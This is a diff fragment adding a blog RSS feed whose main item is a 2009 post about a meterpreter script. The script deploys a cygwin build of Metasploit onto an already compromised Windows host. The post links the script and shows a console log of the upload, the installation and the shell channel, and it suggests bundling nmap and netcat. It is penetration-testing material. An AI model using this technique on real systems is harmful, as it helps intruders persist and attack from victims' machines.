+&lt;p&gt;Now it&amp;rsquo;s your turn to make it better. Take a look at the guts, see if anything will help you in your scripting.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Metasploit Framework as a Payload</title>
+      <link>http://localhost:1313/post/2009/2009626metasploit-framework-as-a-payload-html/</link>
+      <pubDate>Fri, 26 Jun 2009 05:45:08 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/2009626metasploit-framework-as-a-payload-html/</guid>
+      <description>
+
+&lt;p&gt;Well, sorta…&lt;/p&gt;
+
+&lt;p&gt;I created a meterpreter script that takes the cygwin bundled version of Metasploit inside of a NullSoft installer that HD Moore created and deploys it using meterpreter to the compromised host, extracts/installs it, and runs the shell. Now I left this intentionally open so that you could package your own cygwin bundle (possibly with nmap and netcat), for your own evil fun.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Thanks defintely go to Carlos Perez (Dark0perator) and HD Moore for their help getting this bad boy working right.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;You can download the script here: &lt;a href=&#34;http://localhost:1313/scripts-and-programs/metasploit/deploymsf.rb&#34;&gt;/scripts-and-programs/metasploit/deploymsf.rb&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;You can download the cygwin installs from the metasploit website:&lt;/p&gt;
+
+&lt;p&gt;13mb FULL framework: &lt;a href=&#34;https://metasploit.com/framework-3.3-dev.exe&#34;&gt;https://metasploit.com/framework-3.3-dev.exe&lt;/a&gt;&lt;br /&gt;
+5mb MINI (just msfconsole): &lt;a href=&#34;https://metasploit.com/mini-3.3-dev.exe&#34;&gt;https://metasploit.com/mini-3.3-dev.exe&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And here is what it looks like:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt; run deploymsf -f framework-3.3-dev.exe&lt;br /&gt;
+[&lt;em&gt;] Running Meterpreter MSFp Deploytment Script&amp;hellip;..&lt;br /&gt;
+[&lt;/em&gt;] Uploading MSFp for for deployment&amp;hellip;.&lt;br /&gt;
+[&lt;em&gt;] MSFp uploaded as C:DOCUME~1mubixLOCALS~1Temp12681.exe&lt;br /&gt;
+[&lt;/em&gt;] Installing MSFp&amp;hellip;&amp;hellip;&amp;hellip;..&lt;br /&gt;
+[&lt;em&gt;] Done!&lt;br /&gt;
+[&lt;/em&gt;] Installation Complete!&lt;br /&gt;
+[&lt;em&gt;] Running cygwin shell channelized&amp;hellip;&lt;br /&gt;
+[&lt;/em&gt;] Channel 18 created - Type: interact 18 to play&lt;br /&gt;
+[&lt;em&gt;] Be warned, it takes a bit for post setup to happen&lt;br /&gt;
+[&lt;/em&gt;] and you will not see a prompt, try pwd to check&lt;br /&gt;
+meterpreter &amp;gt; interact 18&lt;br /&gt;
+Interacting with channel 18&amp;hellip;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;[&lt;em&gt;] Configuring multi-user permissions for first run&amp;hellip;&lt;br /&gt;
+[&lt;/em&gt;] Configuring the initial user environment&amp;hellip;&lt;br /&gt;
+pwd&lt;br /&gt;
+/home/mubix&lt;br /&gt;
+ls&lt;br /&gt;
+msfconsole&lt;br /&gt;
+*** Metasploit only has EXPERIMENTAL support for Ruby 1.9.1 and newer, things may break!&lt;br /&gt;
+*** Please report bugs to msfdev[at]metasploit.com&lt;br /&gt;
+[-] ***&lt;br /&gt;
+[-] * WARNING: No database support: LoadError no such file to load &amp;ndash; active_record&lt;br /&gt;
+[-] ***&lt;/p&gt;
+
+&lt;h2 id=&#34;toc_0:ea2ba5f26cf1305eefa185d4e5eff0d2&#34;&gt;### ## ##&lt;/h2&gt;
+
+&lt;h2 id=&#34;toc_1:ea2ba5f26cf1305eefa185d4e5eff0d2&#34;&gt;## #### ###### #### ##### ##### ## #### ######&lt;/h2&gt;
+
+&lt;p&gt;####### ## ## ## ## ## ## ## ## ## ## ### ##&lt;br /&gt;
+####### ###### ## ##### #### ## ## ## ## ## ## ##&lt;/p&gt;
+
+&lt;h2 id=&#34;toc_2:ea2ba5f26cf1305eefa185d4e5eff0d2&#34;&gt;# ## ## ## ## ## ## ##### ## ## ## ## ##&lt;/h2&gt;
+
+&lt;h2 id=&#34;toc_3:ea2ba5f26cf1305eefa185d4e5eff0d2&#34;&gt;## #### ### ##### ##### ## #### #### #### ###&lt;/h2&gt;
+
+&lt;p&gt;=[ msf v3.3-dev&lt;br /&gt;
++ &amp;ndash; &amp;ndash;=[ 379 exploits - 231 payloads&lt;br /&gt;
++ &amp;ndash; &amp;ndash;=[ 20 encoders - 7 nops&lt;br /&gt;
+=[ 156 aux&lt;/p&gt;
+
+&lt;p&gt;msf &amp;gt;GAME OVER&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
